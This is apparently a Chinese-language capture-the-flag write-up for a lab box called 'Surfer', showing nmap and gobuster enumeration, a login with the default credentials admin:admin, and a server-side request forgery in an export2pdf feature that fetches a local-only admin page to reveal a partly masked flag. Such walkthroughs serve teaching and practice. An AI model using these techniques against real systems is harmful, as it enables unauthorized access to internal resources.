# Surfer

哇，看看这个激进的应用程序！不是纳利公子吗？我们一直在浏览一些网页，我们也想让你加入！他们说这个应用程序有一些功能，只能供内部使用 - 但如果你赶上了正确的浪潮，你可能会找到甜蜜的东西！

---

## 端口扫描

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.21.153
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 19:32 CST
    Nmap scan report for 10.10.21.153
    Host is up (0.30s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

## web检索

web一打开就是一个登录页面

gobuster扫一下：

    gobuster dir --url http://10.10.21.153/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

    /backup               (Status: 301) [Size: 313] [--> http://10.10.21.153/backup/]
    /index.php            (Status: 302) [Size: 0] [--> /login.php]
    /internal             (Status: 301) [Size: 315] [--> http://10.10.21.153/internal/]
    /robots.txt           (Status: 200) [Size: 40]
    /server-status        (Status: 403) [Size: 277]
    /vendor               (Status: 301) [Size: 313] [--> http://10.10.21.153/vendor/]

robots.txt:

    User-Agent: *
    Disallow: /backup/chat.txt

chat.txt是一段对话：

    Admin: I have finished setting up the new export2pdf tool.
    Kate: Thanks, we will require daily system reports in pdf format.
    Admin: Yes, I am updated about that.
    Kate: Have you finished adding the internal server.
    Admin: Yes, it should be serving flag from now.
    Kate: Also Don't forget to change the creds, plz stop using your username as password.
    Kate: Hello.. ?

爆破/internal

    gobuster dir --url http://10.10.21.153/internal/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

    /admin.php            (Status: 200) [Size: 39]

该页面只允许本地访问：

    This page can only be accessed locally.

尝试修改x-forwarded-for绕过，并没有成功

好了，目录枚举到此为止

回到我们刚刚那段对话，从最后一句话的语态可以看得出，admin应该没有改密码

所以回到登录页面尝试一下admin:admin

登录成功

## SSRF

在后台找到了那段对话中所说的export2pdf的功能

点击后：


    Report generated for http://127.0.0.1/server-info.php
    
    Hosting Server Information

    Operating System: Linux
    Server IP: 127.0.0.1
    Server Hostname: 01a5b58d4be9
    Server Protocol: HTTP/1.1
    Server Administrator: webmaster@localhost
    Server Web Port: 80
    PHP Version: 7.2.34
    CGI Version: CGI/1.1
    System Uptime: 12:28:10 up 57 min, 0 users, load average: 0.00, 0.00, 0.00
    Powered by TCPDF (www.tcpdf.org)

这句话有点意思：

    Report generated for http://127.0.0.1/server-info.php

我尝试访问“http://10.10.21.153/server-info.php”

    Hosting Server Information

    Operating System:Linux
    Server IP:172.17.0.2
    Server Hostname:01a5b58d4be9
    Server Protocol:HTTP/1.1
    Server Administrator:webmaster@localhost
    Server Web Port:80
    PHP Version:7.2.34
    CGI Version:CGI/1.1
    System Uptime:12:19:30 up 48 min, 0 users, load average: 0.00, 0.00, 0.00

burp抓包还看到：

    POST /export2pdf.php HTTP/1.1

    请求表单：
        url=http://127.0.0.1/server-info.php

很明显了。export2pdf功能可以将网络任意文件转为pdf，但，如果这个文件是来自本地内部才允许访问的呢

还记得我们刚刚扫描得到/internal/admin.php

burp将刚刚抓的包丢进repeater，url参数改成：

    url=http://127.0.0.1/internal/admin.php

发送此包，成功拿到flag

    flag{6255c5*********53c9937810}
